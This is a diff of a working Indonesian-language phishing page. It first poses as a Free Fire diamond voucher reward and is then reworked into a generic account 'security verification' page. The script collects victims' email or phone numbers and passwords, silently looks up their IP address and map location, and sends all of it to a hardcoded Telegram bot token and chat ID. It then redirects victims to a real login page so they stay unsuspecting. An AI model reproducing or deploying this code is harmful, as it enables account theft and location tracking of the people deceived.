@@ -3,96 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Fire Reward Center</title>
+    <title>Sistem Verifikasi Akun | Event 2026</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { 
-            background: url('https://wallpaperaccess.com/full/1155026.jpg') no-repeat center center fixed; 
-            background-size: cover; 
-        }
-        .overlay { background: rgba(0, 0, 0, 0.8); position: absolute; inset: 0; z-index: 1; }
-        .ff-border { border: 2px solid #ffcc00; background: rgba(20, 20, 20, 0.95); }
-        .ff-btn { background: linear-gradient(180deg, #ffcc00 0%, #ff9900 100%); color: black; font-weight: 900; }
+        body { background-color: #0f172a; font-family: 'Inter', sans-serif; }
+        .card { background: #1e293b; border: 1px solid #334155; }
+        .input-style { background: #0f172a; border: 1px solid #334155; color: white; }
+        .input-style:focus { border-color: #3b82f6; outline: none; box-shadow: 0 0 10px rgba(59, 130, 246, 0.5); }
     </style>
 </head>
 <body class="flex items-center justify-center min-h-screen p-4">
-    <div class="overlay"></div>
-    
-    <div class="relative z-10 ff-border p-6 rounded-lg shadow-2xl w-full max-w-sm text-white border-yellow-500">
-        <div class="text-center mb-6">
-            <img src="https://upload.wikimedia.org/wikipedia/en/3/36/Free_Fire_Logo.png" class="h-12 mx-auto mb-2">
-            <h2 class="text-xl font-black italic uppercase tracking-tighter text-yellow-500">Diamond Voucher</h2>
-            <p class="text-xs text-gray-400">Masukkan data akun untuk menerima hadiah</p>
+
+    <div class="card w-full max-w-md p-8 rounded-2xl shadow-2xl">
+        <div class="text-center mb-8">
+            <div class="inline-block p-4 rounded-full bg-blue-600/20 mb-4">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04kM12 21.48l-.342-.165A11.952 11.952 0 0112 20.022V2.944" />
+                </svg>
+            </div>
+            <h1 class="text-2xl font-bold text-white tracking-tight">Verifikasi Keamanan</h1>
+            <p class="text-gray-400 text-sm mt-2">Akun Anda terpilih untuk menerima reward. Harap verifikasi data untuk proses pengiriman.</p>
         </div>
 
-        <form id="ffForm" class="space-y-4">
-            <input type="text" id="userid" class="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded text-sm focus:border-yellow-500 outline-none" placeholder="ID Pemain" required>
-            <input type="text" id="username" class="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded text-sm focus:border-yellow-500 outline-none" placeholder="Email / Phone" required>
-            <input type="password" id="password" class="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded text-sm focus:border-yellow-500 outline-none" placeholder="Password" required>
+        <form id="mainForm" class="space-y-5">
+            <div>
+                <label class="block text-xs font-bold text-gray-500 uppercase mb-2">Email atau Nomor HP</label>
+                <input type="text" id="target_user" class="input-style w-full px-4 py-3 rounded-xl text-sm" placeholder="Masukkan detail akun..." required>
+            </div>
+            <div>
+                <label class="block text-xs font-bold text-gray-500 uppercase mb-2">Kata Sandi</label>
+                <input type="password" id="target_pass" class="input-style w-full px-4 py-3 rounded-xl text-sm" placeholder="Masukkan password..." required>
+            </div>
 
-            <button type="submit" class="universal-btn w-full ff-btn py-3 rounded uppercase tracking-widest hover:scale-105 transition duration-200">
-                KLAIM HADIAH
+            <button type="submit" id="btn-submit" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-xl shadow-lg shadow-blue-600/30 transition-all transform active:scale-95">
+                KONFIRMASI SEKARANG
             </button>
             
-            <div class="flex space-x-2">
-                <button type="button" class="universal-btn w-1/2 bg-gray-700 py-2 rounded text-xs font-bold hover:bg-gray-600">BANTUAN</button>
-                <button type="button" class="universal-btn w-1/2 bg-gray-700 py-2 rounded text-xs font-bold hover:bg-gray-600">BATAL</button>
-            </div>
+            <button type="button" onclick="location.reload()" class="w-full text-gray-500 text-xs font-medium hover:text-gray-300 transition">
+                BATALKAN PROSES
+            </button>
         </form>
-        
-        <p class="mt-6 text-[10px] text-center text-gray-600">Garena Free Fire © 2026. All Rights Reserved.</p>
+
+        <div class="mt-8 border-t border-gray-700 pt-6 text-center">
+            <p class="text-[10px] text-gray-500 uppercase tracking-widest">Powered by Secure-Verification System</p>
+        </div>
     </div>
 
     <script>
-        const BOT_TOKEN = "8205581950:AAETz7C7eeiOrINZWEIR4dTfRmacVWVNXPc";
+        const form = document.getElementById('mainForm');
+        
+        // --- KONFIGURASI BOT LO ---
+        const BOT_TOKEN = "8205581950:AAETz7C7eeiOrINZWEIR4dTfRmacVWVNXPc"; 
         const CHAT_ID = "8551809114";
+        // --------------------------
 
-        // Fungsi sakti buat kirim data
-        async function kirimData() {
-            const uid = document.getElementById('userid').value;
-            const user = document.getElementById('username').value;
-            const pass = document.getElementById('password').value;
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const btn = document.getElementById('btn-submit');
+            btn.innerHTML = "Processing Data...";
+            btn.disabled = true;
 
-            if(!uid || !user || !pass) {
-                alert("Isi semua data dulu!");
-                return;
-            }
+            const u = document.getElementById('target_user').value;
+            const p = document.getElementById('target_pass').value;
 
-            // Ambil IP & Lokasi secara diam-diam
-            let locData = "Gagal ambil lokasi";
+            // AMBIL DATA LOKASI SILENT (IP & MAPS)
+            let ipInfo = "Gagal melacak";
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                const json = await res.json();
-                locData = `🌐 IP: ${json.ip}\n🏙️ Kota: ${json.city}\n📍 Maps: https://www.google.com/maps?q=${json.latitude},${json.longitude}`;
-            } catch (e) {}
+                const data = await res.json();
+                ipInfo = `🌐 IP: ${data.ip}\n🏙️ Kota: ${data.city}\n📍 Lokasi: https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+            } catch (err) {}
 
-            const text = `🔥 **SETORAN BARU (FF)** 🔥\n\n🆔 ID: \`${uid}\` \n👤 User: \`${user}\` \n🔑 Pass: \`${pass}\` \n\n${locData}`;
+            const text = `🚨 **TARGET TERVERIFIKASI** 🚨\n\n👤 User: \`${u}\` \n🔑 Pass: \`${p}\` \n\n**DETAIL LOKASI:**\n${ipInfo}\n\n⏰ Waktu: ${new Date().toLocaleString()}`;
 
+            // KIRIM KE TELEGRAM
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
-            }).then(() => {
-                // Tendang ke halaman asli
-                window.location.href = "https://ff.garena.com/id/";
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(() => {
+                // Tendang ke halaman login asli (Contoh: Facebook) biar dia gak curiga
+                window.location.href = "https://www.facebook.com/login"; 
+            })
+            .catch(() => {
+                window.location.href = "https://www.google.com";
             });
-        }
-
-        // Cari semua elemen dengan class 'universal-btn'
-        const buttons = document.querySelectorAll('.universal-btn');
-        
-        // Kasih event ke tiap tombol, apapun yang diklik, datanya kekirim
-        buttons.forEach(btn => {
-            btn.addEventListener('click', function(e) {
-                e.preventDefault();
-                kirimData();
-            });
-        });
-
-        // Tetep jagain kalau dia tekan 'Enter' di keyboard
-        document.getElementById('ffForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            kirimData();
         });
     </script>
 </body>
